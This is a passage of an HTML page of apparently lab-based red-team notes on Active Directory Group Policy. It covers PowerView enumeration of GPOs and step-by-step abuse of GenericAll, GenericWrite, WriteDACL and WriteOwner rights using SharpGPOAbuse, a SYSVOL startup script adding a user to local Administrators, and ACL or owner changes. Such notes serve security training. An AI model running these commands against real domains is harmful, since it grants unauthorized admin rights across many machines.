+<li><p>Map a <strong>shared drive (Z:)</strong> for all users → set it in <strong>User Configuration &gt; Preferences &gt; Drive Maps</strong>.</p></li>
+</ul>
+<h4 id="group-policy-as-an-attack-vector">⚠️ <strong>Group Policy as an Attack Vector</strong></h4>
+<p>GPOs can be <strong>abused</strong> by attackers for:</p>
+<ul>
+<li><p><strong>Privilege Escalation</strong> – Add accounts to privileged groups via GPO.</p></li>
+<li><p><strong>Persistence</strong> – Use <strong>logon/startup scripts</strong> to run backdoors or malware.</p></li>
+<li><p><strong>Backdoors</strong> – Push <strong>malicious scheduled tasks</strong> or tools across endpoints.</p></li>
+<li><p><strong>Security Bypass</strong> – Disable antivirus, firewall, or auditing logs.</p></li>
+</ul>
+<p>🧠 <em>Example</em>: An attacker with GPO edit access adds a PowerShell payload to a logon script, compromising all systems in the targeted OU.</p>
+<p><strong><em>Note:-</em></strong> Using the command line tool from powerview you can list group policies, but you cannot list the settings</p>
+<h4 id="get-list-of-gpo-in-current-domain.">Get list of GPO in current domain.</h4>
+<pre class="powershell"><code>
+Get-DomainGPO 
+</code></pre>
+<p>Lists all Group Policy Objects (GPOs) in the current domain.</p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p><strong>Filter the output to only shows the Group Policy Objects name:</strong></p>
+<pre class="powershell"><code>
+Get-DomainGPO  |  select DisplayName     
+</code></pre>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>you can only view the GPO name but cannot view the policies being applied by each GPO, eg: you cannot view the policies applied by applocker</p>
+<blockquote>
+<p>Note: - Tools like GP result or RSOP can only show group policy of current machine and not of remote machine</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<p><strong>Get a Specific GPO’s Details:</strong></p>
+<pre class="powershell"><code>
+Get-DomainGPO -Identity &quot;DevOps Policy&quot;
+</code></pre>
+<p>Output (example):</p>
+<pre class="yaml"><code>
+displayname       : DevOps Policy
+
+gpcfilesyspath    : \\corp.local\SysVol\corp.local\Policies\{0BF8D01C-1F62-4BDC-958C-57140B67D147}
+
+objectguid        : 0bf8d01c-1f62-4bdc-958c-57140b67d147
+
+whencreated       : 7/01/2025 02:34:56 PM
+
+whenchanged       : 8/05/2025 09:15:12 AM
+
+versionnumber     : 12
+
+distinguishedname : CN={0BF8D01C-1F62-4BDC-958C-57140B67D147},CN=Policies,CN=System,DC=corp,DC=local
+</code></pre>
+<ul>
+<li><p><strong><code>gpcfilesyspath</code></strong> is the path where the GPO’s settings files live — critical for GPOddity abuse.</p></li>
+<li><p><strong><code>distinguishedname</code></strong> is the LDAP path for AD metadata.</p></li>
+</ul>
+<hr />
+<p><strong><em>Get-DomainGPO -ComputerIdentity dcorp-student1</em> →</strong> **Shows only the GPOs that apply to a specific computer, such as <code>dcorp-student1</code>.</p>
+<hr />
+<p><strong>Get GPO(s) which use Restricted Groups or groups.xml for interesting users:</strong></p>
+<pre class="powershell"><code>
+**Get-DomainGPOLocalGroup**        ** 
+</code></pre>
+<p>This command finds <strong>Group Policy Objects (GPOs)</strong> that modify <strong>local group memberships,</strong> such as adding users to the local Administrators on domain-joined machines.</p>
+<p>It specifically looks for:</p>
+<ul>
+<li><p><strong>Restricted Groups</strong></p></li>
+<li><p><strong>Groups.xml</strong> (used by Group Policy Preferences)</p></li>
+</ul>
+<p>These are methods used by admins (and sometimes attackers) to <strong>add or remove users/groups from local groups</strong>, especially <strong>local Administrators</strong>.</p>
+<p><strong>Why It Matters (Red Team Perspective):</strong></p>
+<p>An attacker with <strong>write access to a GPO</strong> can use it to:</p>
+<ul>
+<li><p>Add themselves (or another user) to the <strong>Administrators group</strong> on all systems where the GPO is applied.</p></li>
+<li><p>Achieve <strong>stealthy privilege escalation or persistence</strong> without touching the machine directly.</p></li>
+</ul>
+<p><strong>Example:</strong></p>
+<ul>
+<li><p>There is an <strong>Organizational Unit (OU)</strong> named <code>Workstation</code>, which contains <strong>100 domain-joined devices</strong>.</p></li>
+<li><p>Due to <strong>security compliance</strong>, enabling or managing local Administrator accounts <strong>manually</strong> on each of the 100 devices is <strong>not feasible or allowed</strong>.</p></li>
+<li><p>So, a new <strong>Group Policy Object (GPO)</strong> is created called <code>Workstation-Admin</code>.</p></li>
+<li><p>This GPO uses <strong>Restricted Groups</strong> to:</p>
+<ul>
+<li>Modify the <strong>local Administrators group</strong> on all devices in the <code>Workstation</code> OU.</li>
+<li>Add a specific domain group, e.g., <code>CORP\WorkstationAdminGroup</code>, to the <strong>Administrators group</strong> on each workstation.</li>
+</ul></li>
+<li><p>This GPO is <strong>linked to the Workstation OU</strong>, which means it will be <strong>enforced on all 100 devices</strong> within the OU.</p></li>
+<li><p>As a result, <strong>any user</strong> added to <code>CORP\WorkstationAdminGroup</code> will now have <strong>local admin rights</strong> on <strong>all 100 systems</strong>.</p></li>
+</ul>
+<hr />
+<h3 id="domain-enumeration---gpo">Domain Enumeration - GPO</h3>
+<ol type="1">
+<li><strong>Get users which are in a local group of a machine using GPO:</strong></li>
+</ol>
+<pre class="powershell"><code>
+ Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcorp-student1 
+</code></pre>
+<p>This command checks <strong>which users or groups</strong> are being added to the <strong>local groups</strong> (like Administrators) <strong>on a specific machine</strong> (<code>dcorp-student1</code>) via <strong>Group Policy</strong>.</p>
+<p>🔍 <strong>How it works</strong>:</p>
+<ul>
+<li><p>It analyzes GPOs applied to the target machine.</p></li>
+<li><p>Especially looks at GPOs that use <strong>Restricted Groups</strong> or <strong>Groups.xml</strong> to assign users to local groups.</p></li>
+<li><p>Shows what <strong>local group modifications</strong> are happening <strong>through GPOs</strong> (not manually set).</p></li>
+</ul>
+<ol type="1">
+<li><strong>Get machines where the given user is member of a specific group:</strong></li>
+</ol>
+<pre class="powershell"><code>
+Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose
+</code></pre>
+<p>✅ <strong>Purpose</strong>:</p>
+<p>This command finds <strong>which machines</strong> a specific <strong>user</strong> (e.g., <code>student1</code>) is being <strong>added to local groups</strong> on, through <strong>Group Policy</strong>.</p>
+<p>🔍 <strong>How it works</strong>:</p>
+<ul>
+<li><p>It maps GPOs that add the specified user to <strong>local groups on various computers</strong>.</p></li>
+<li><p>Helps track <strong>where this user has elevated permissions</strong> via GPO.</p></li>
+</ul>
+<p>📌 <strong>Use case</strong>:</p>
+<p>You want to find out:</p>
+<p>👉 <em>“On which machines does <code>student1</code> get local admin or group access via GPO?”</em></p>
+<hr />
+<h3 id="why-this-is-important-for-red-teaming">🔐 Why This Is Important for Red Teaming:</h3>
+<ul>
+<li><p>These mappings often <strong>reveal privileged access</strong> across systems.</p></li>
+<li><p>If a GPO adds a user to the <strong>local Administrators group</strong> on 100 machines, that GPO (or the user) is an <strong>attractive lateral movement or privilege escalation target</strong>.</p></li>
+<li><p>Attackers can look for misconfigured or overly permissive GPOs that give <strong>unintended admin rights</strong>.</p></li>
+</ul>
+<h3 id="abuse-logic">Abuse Logic</h3>
+<h4 id="what-rights-are-needed-for-gpo-abuse">🔐 What Rights Are Needed for GPO Abuse?</h4>
+<p>To abuse a GPO, you need <strong>write-level control</strong> over it.</p>
+<h4 id="common-abusable-rights">✅ Common Abusable Rights</h4>
+<div class="line-block">Right | Meaning | Abuse Possible? |</div>
+<div class="line-block">— | — | — |</div>
+<div class="line-block"><strong>GenericAll</strong> | Full control | ✅ YES |</div>
+<div class="line-block"><strong>GenericWrite</strong> | Modify attributes | ✅ YES |</div>
+<div class="line-block"><strong>WriteDACL</strong> | Change permissions | ✅ YES (indirect) |</div>
+<div class="line-block"><strong>WriteOwner</strong> | Take ownership | ✅ YES (indirect) |</div>
+<h4 id="scenario-1-genericall-direct-control">🔥 SCENARIO 1 — GenericAll (DIRECT CONTROL)</h4>
+<p><strong>🎯 Situation</strong></p>
+<p>You are:</p>
+<pre><code>
+domain\user1
+</code></pre>
+<p>BloodHound shows:</p>
+<pre><code>
+user1 → GenericAll → &quot;Workstation GPO&quot;
+</code></pre>
+<p><strong>💣 What You Do</strong></p>
+<p>👉 You already have full control → no setup needed</p>
+<p>Run:</p>
+<pre><code>
+SharpGPOAbuse.exe --AddComputerScript \
+
+--ScriptName addadmin.bat \
+
+--ScriptContents &quot;net localgroup administrators user1 /add&quot; \
+
+--GPOName &quot;Workstation GPO&quot;
+</code></pre>
+<p><strong>⚙️ What Happens Internally</strong></p>
+<ul>
+<li>Script gets added in:</li>
+</ul>
+<pre><code>
+\\domain\SYSVOL\Policies\{GPO_GUID}\Machine\Scripts\Startup\
+</code></pre>
+<ul>
+<li>GPO is updated to execute it</li>
+</ul>
+<p><strong>💀 Result</strong></p>
+<p>After GPO refresh:</p>
+<pre><code>
+user1 becomes LOCAL ADMIN on all machines in that GPO
+</code></pre>
+<p><strong>🧠 Key Understanding</strong></p>
+<p>👉 You directly changed the GPO → instant abuse</p>
+<h4 id="scenario-2-genericwrite-modify-settings">🔥 SCENARIO 2 — GenericWrite (MODIFY SETTINGS)</h4>
+<p><strong>🎯 Situation</strong></p>
+<pre><code>
+user1 → GenericWrite → &quot;Workstation GPO&quot;
+</code></pre>
+<p><strong>⚠️ Important Difference</strong></p>
+<p>👉 You <strong>can modify GPO settings</strong>, but not full control like GenericAll</p>
+<h4 id="what-you-do">💣 What You Do</h4>
+<p><strong>Step 1 — Add script reference in GPO</strong></p>
+<p>You modify GPO attribute to say:</p>
+<pre><code>
+Run this script at startup → evil.bat
+</code></pre>
+<p><strong>Step 2 — Place your script in SYSVOL</strong></p>
+<pre><code>
+echo net localgroup administrators user1 /add &gt; evil.bat
+</code></pre>
+<p>Put it in:</p>
+<pre><code>
+\\domain\SYSVOL\Policies\{GPO_GUID}\Machine\Scripts\Startup\
+</code></pre>
+<h4 id="what-happens">⚙️ What Happens</h4>
+<ul>
+<li><p>GPO now points to your script</p></li>
+<li><p>Machines execute it</p></li>
+</ul>
+<h4 id="result-3">💀 Result</h4>
+<p>Same:</p>
+<pre><code>
+user1 → local admin everywhere
+</code></pre>
+<h4 id="key-difference">🧠 Key Difference</h4>
+<p>👉 You didn’t fully control GPO</p>
+<p>👉 You <strong>modified its behavior</strong></p>
+<h4 id="scenario-3-writedacl-permission-escalation">🔥 SCENARIO 3 — WriteDACL (PERMISSION ESCALATION)</h4>
+<p><strong>🎯 Situation</strong></p>
+<pre><code>
+user1 → WriteDACL → &quot;Workstation GPO&quot;
+</code></pre>
+<p><strong>🧠 What This Means</strong></p>
+<p>👉 You <strong>CANNOT modify GPO yet</strong></p>
+<p>But you CAN:</p>
+<pre><code>
+Change who has permissions
+</code></pre>
+<h4 id="what-you-do-1">💣 What You Do</h4>
+<p><strong>Step 1 — Give yourself full control</strong></p>
+<pre><code>
+Add-DomainObjectAcl -TargetIdentity &quot;Workstation GPO&quot; \
+
+-PrincipalIdentity user1 \
+
+-Rights All
+</code></pre>
+<hr />
+<p><strong>Step 2 — Now you have:</strong></p>
+<pre><code>
+user1 → GenericAll → GPO
+</code></pre>
+<p><strong>Step 3 — Abuse like Scenario 1</strong></p>
+<pre><code>
+SharpGPOAbuse.exe ...
+</code></pre>
+<h4 id="result-4">💀 Result</h4>
+<p>Same:</p>
+<pre><code>
+Code execution → local admin everywhere
+</code></pre>
+<h4 id="key-understanding-2">🧠 Key Understanding</h4>
+<p>👉 WriteDACL = “I can give myself power”</p>
+<h4 id="scenario-4-writeowner-take-ownership">🔥 SCENARIO 4 — WriteOwner (TAKE OWNERSHIP)</h4>
+<p><strong>🎯 Situation</strong></p>
+<pre><code>
+user1 → WriteOwner → &quot;Workstation GPO&quot;
+</code></pre>
+<hr />
+<p><strong>🧠 What This Means</strong></p>
+<p>👉 You can change:</p>
+<pre><code>
+OWNER of the GPO
+</code></pre>
+<hr />
+<h4 id="what-you-do-2">💣 What You Do</h4>
+<p><strong>Step 1 — Become owner</strong></p>
+<pre><code>
+Set-DomainObjectOwner -Identity &quot;Workstation GPO&quot; \
+
+-OwnerIdentity user1
+</code></pre>
+<hr />
+<p><strong>Step 2 — As owner → change permissions</strong></p>
+<pre><code>
+Add-DomainObjectAcl -TargetIdentity &quot;Workstation GPO&quot; \
+
+-PrincipalIdentity user1 \
+
+-Rights All
+</code></pre>
+<hr />
+<p><strong>Step 3 — Now you have:</strong></p>
+<pre><code>
+GenericAll
+</code></pre>
+<hr />
+<p><strong>Step 4 — Abuse like Scenario 1</strong></p>
+<hr />
+<h4 id="result-5">💀 Result</h4>
+<p>Same final impact</p>
+<hr />
+<h4 id="key-understanding-3">🧠 Key Understanding</h4>
+<p>👉 Owner = ultimate control over permissions</p>
+<hr />
+<h4 id="final-comparison-super-important">🔥 FINAL COMPARISON (SUPER IMPORTANT)</h4>
+<div class="line-block">Right | What you initially can do | What you convert it into |</div>
+<div class="line-block">— | — | — |</div>
+<div class="line-block">GenericAll | Full control | Direct abuse |</div>
+<div class="line-block">GenericWrite | Modify settings | Script execution |</div>
+<div class="line-block">WriteDACL | Change permissions | → GenericAll |</div>
+<div class="line-block">WriteOwner | Take ownership | → WriteDACL → GenericAll |</div>
+</article>
+  <aside class="toc-rail"><div class="toc-title">On this page</div><ul>
+<li class="lvl2"><a href="#dacl-sacl">DACL &amp;amp; SACL</a></li>
+<li class="lvl2"><a href="#genericwrite">🔐 GenericWrite</a></li>
+<li class="lvl2"><a href="#generic-all">Generic All</a></li>
+<li class="lvl2"><a href="#write-dacl">Write DACL</a></li>
+<li class="lvl2"><a href="#all-extended-rights">All Extended Rights</a></li>
+<li class="lvl2"><a href="#write-owner">Write Owner</a></li>
+<li class="lvl2"><a href="#ou-abuse">OU Abuse</a></li>
+<li class="lvl2"><a href="#genericall-write-on-ou">GenericAll / Write on OU</a></li>
+<li class="lvl2"><a href="#gpo-abuse">GPO Abuse</a></li>
+</ul></aside>
+</div>
+
+</main>
+</div>
+<button class="theme-toggle" id="themeToggle" onclick="toggleTheme()" title="Toggle theme">🌙</button>
+<button class="totop" id="toTop" onclick="scrollTo({top:0,behavior:'smooth'})" title="Back to top">↑</button>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="assets/fulltext-index.js"></script>
+<script src="assets/app.js"></script>
+</body>
+</html>
